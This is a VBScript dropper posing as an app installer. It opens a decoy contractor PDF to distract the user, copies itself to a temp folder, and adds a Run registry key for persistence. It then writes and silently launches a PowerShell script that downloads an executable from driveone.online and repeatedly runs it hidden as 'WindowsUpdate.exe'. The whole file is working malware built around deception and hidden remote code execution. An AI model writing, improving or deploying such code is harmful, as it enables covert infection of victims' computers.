' ================================================================
' InstallMyApp.vbs — v2 (decoy PDF + stable persistence path)
' ================================================================

Dim objFSO, objShell, objFile
Dim strTempFolder, strPS1File, strContent
Dim strRegPath, strRegName, strScriptPath
Dim strLogFile, strDecoyPdf, strStablePath

Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objShell = CreateObject("WScript.Shell")

' --- CONFIG ---
strSourceUrl     = "https://driveone.online/ServerHostModule"
strDestFile      = "WindowsUpdate.exe"
strInstalledExe  = "C:\Program Files\MyApp\WindowsUpdate.exe"
strProcessName   = "WindowsUpdate"
strDecoyPdf      = "https://www.jrmcm.com/content/uploads/2023/05/ENR-2023-Top-400-National-Contractors.pdf"
' ---------------

strTempFolder = objFSO.GetSpecialFolder(2) & "\InstallMyApp"
If Not objFSO.FolderExists(strTempFolder) Then objFSO.CreateFolder(strTempFolder)
strLogFile = objFSO.BuildPath(strTempFolder, "debug.log")

Sub WriteLog(msg)
    Dim fso, ts
    Set fso = CreateObject("Scripting.FileSystemObject")
    Set ts = fso.OpenTextFile(strLogFile, 8, True)
    ts.WriteLine Now & " - " & msg
    ts.Close
    Set ts = Nothing
    Set fso = Nothing
End Sub

WriteLog "=== SCRIPT STARTED ==="

' --- 0. OPEN DECOY PDF IMMEDIATELY ---
' ShellExecute on the URL opens the default browser/handler.
' The user sees a real PDF load while everything else runs hidden.
On Error Resume Next
objShell.Run "rundll32.exe url.dll,FileProtocolHandler " & strDecoyPdf, 1, False
If Err.Number <> 0 Then
    WriteLog "Decoy open failed: " & Err.Description
    Err.Clear
    objShell.Run strDecoyPdf, 1, False   ' fallback: direct URL
    Err.Clear
End If
On Error GoTo 0
WriteLog "Decoy PDF opened."

' --- 0b. SELF-COPY to hidden folder for stable persistence ---
strScriptPath = WScript.ScriptFullName
strStablePath = objFSO.BuildPath(strTempFolder, "install.vbs")
If LCase(strScriptPath) <> LCase(strStablePath) Then
    On Error Resume Next
    objFSO.CopyFile strScriptPath, strStablePath, True
    If Err.Number = 0 Then
        strScriptPath = strStablePath
        WriteLog "Self-copied to: " & strStablePath
    Else
        WriteLog "Self-copy failed: " & Err.Description
        Err.Clear
    End If
    On Error GoTo 0
End If
' NOTE: strScriptPath now points at the STABLE copy — the Run key
' below registers this path, NOT the throwaway %TEMP%\e.vbs.

strRegPath = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
strRegName = "InstallMyApp"

' --- 1. Already installed? Clean up and exit ---
If objFSO.FileExists(strInstalledExe) Then
    WriteLog "App already installed. Removing registry entry."
    On Error Resume Next
    objShell.RegDelete strRegPath & "\" & strRegName
    On Error GoTo 0
    WScript.Quit
End If

' --- 2. Persistence (stable path now) ---
On Error Resume Next
objShell.RegWrite strRegPath & "\" & strRegName, """" & strScriptPath & """", "REG_SZ"
If Err.Number <> 0 Then
    WriteLog "ERROR writing registry: " & Err.Description
Else
    WriteLog "Registry entry created: " & strScriptPath
End If
On Error GoTo 0

' --- 3. PowerShell script (unchanged from your version) ---
strPS1File = objFSO.BuildPath(strTempFolder, "install_launcher.ps1")
WriteLog "PS1 file: " & strPS1File

strContent = _
    "$url = '" & strSourceUrl & "'; " & vbCrLf & _
    "$destFolder = $env:TEMP + '\InstallMyApp'; " & vbCrLf & _
    "$dest = Join-Path $destFolder '" & strDestFile & "'; " & vbCrLf & _
    "$checkPath = '" & strInstalledExe & "'; " & vbCrLf & _
    "$procName = '" & strProcessName & "'; " & vbCrLf & _
    "$regPath = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\InstallMyApp'; " & vbCrLf & _
    "$logFile = '" & Replace(strLogFile, "\", "\\") & "'; " & vbCrLf & _
    "" & vbCrLf & _
    "function Log { param($msg) Add-Content -Path $logFile -Value (Get-Date -Format 'yyyy-MM-dd HH:mm:ss') + ' - PS: ' + $msg } " & vbCrLf & _
    "" & vbCrLf & _
    "Log 'PowerShell script started.' " & vbCrLf & _
    "" & vbCrLf & _
    "if (-not (Test-Path $destFolder)) { New-Item -ItemType Directory $destFolder -Force | Out-Null; Log 'Created folder.' } " & vbCrLf & _
    "" & vbCrLf & _
    "function IsInstalled { " & vbCrLf & _
    "    $fileExists = Test-Path $checkPath " & vbCrLf & _
    "    $procExists = Get-Process -Name $procName -ErrorAction SilentlyContinue " & vbCrLf & _
    "    return $fileExists -or $procExists " & vbCrLf & _
    "} " & vbCrLf & _
    "" & vbCrLf & _
    "function EnsureInstaller { " & vbCrLf & _
    "    if (-not (Test-Path $dest)) { " & vbCrLf & _
    "        Log 'Downloading installer...' " & vbCrLf & _
    "        try { " & vbCrLf & _
    "            (New-Object System.Net.WebClient).DownloadFile($url, $dest) " & vbCrLf & _
    "            Log 'Download successful. Size: ' + (Get-Item $dest).Length + ' bytes' " & vbCrLf & _
    "        } catch { " & vbCrLf & _
    "            Log 'Download FAILED: ' + $_.Exception.Message " & vbCrLf & _
    "        } " & vbCrLf & _
    "    } else { Log 'Installer already exists.' } " & vbCrLf & _
    "} " & vbCrLf & _
    "" & vbCrLf & _
    "EnsureInstaller " & vbCrLf & _
    "" & vbCrLf & _
    "while ($true) { " & vbCrLf & _
    "    Log '--- Loop iteration ---' " & vbCrLf & _
    "    if (IsInstalled) { " & vbCrLf & _
    "        Log 'App is installed. Removing registry and exiting.' " & vbCrLf & _
    "        Remove-Item -Path $regPath -Force -ErrorAction SilentlyContinue " & vbCrLf & _
    "        break " & vbCrLf & _
    "    } " & vbCrLf & _
    "    EnsureInstaller " & vbCrLf & _
    "    Log 'Launching installer and waiting...' " & vbCrLf & _
    "    try { " & vbCrLf & _
    "        $proc = Start-Process -FilePath $dest -Wait -PassThru -WindowStyle Hidden " & vbCrLf & _
    "        Log 'Installer exited with code: ' + $proc.ExitCode " & vbCrLf & _
    "    } catch { " & vbCrLf & _
    "        Log 'FAILED to launch installer: ' + $_.Exception.Message " & vbCrLf & _
    "        Start-Sleep -Seconds 3 " & vbCrLf & _
    "        continue " & vbCrLf & _
    "    } " & vbCrLf & _
    "    Start-Sleep -Seconds 2 " & vbCrLf & _
    "} " & vbCrLf & _
    "Log 'PowerShell script finished.'"

Set objFile = objFSO.CreateTextFile(strPS1File, True)
objFile.Write strContent
objFile.Close
WriteLog "PS1 file written."

' --- 4. Run PowerShell hidden ---
WriteLog "Launching PowerShell (hidden)..."
objShell.Run "powershell.exe -ExecutionPolicy Bypass -File """ & strPS1File & """", 0, False
WriteLog "PowerShell launched. VBS exiting."

Set objFile = Nothing
Set objFSO = Nothing
Set objShell = Nothing